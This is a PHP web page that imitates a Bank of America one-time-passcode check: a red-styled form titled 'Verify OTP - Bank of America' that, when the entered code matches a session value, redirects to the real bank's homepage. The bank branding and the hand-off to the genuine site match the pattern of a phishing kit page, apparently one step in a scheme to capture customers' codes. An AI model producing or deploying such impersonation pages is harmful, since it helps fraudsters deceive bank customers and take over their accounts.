<?php
session_start();
$correct_otp = $_SESSION['otp'] ?? null;
$error = "";

// If form submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $entered_otp = $_POST['otp'] ?? '';

    if ($entered_otp == $correct_otp) {
        // OTP matches, redirect to official Bank of America homepage
        header("Location: https://www.bankofamerica.com");
        exit;
    } else {
        // OTP doesn't match
        $error = "Invalid OTP. Please try again.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify OTP - Bank of America</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fff;
            padding: 40px;
            color: #000;
        }

        .container {
            max-width: 400px;
            margin: auto;
            border: 1px solid #ddd;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px #ccc;
        }

        h2 {
            color: #c00;
            margin-bottom: 20px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }

        button {
            background-color: #c00;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #a00;
        }

        .error {
            color: red;
            margin-bottom: 15px;
        }

    </style>
</head>
<body>
    <div class="container">
        <h2>Enter Your OTP Code</h2>
        <?php if ($error): ?>
            <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        <form method="POST">
            <input type="text" name="otp" placeholder="Enter the 6-digit code" required>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>
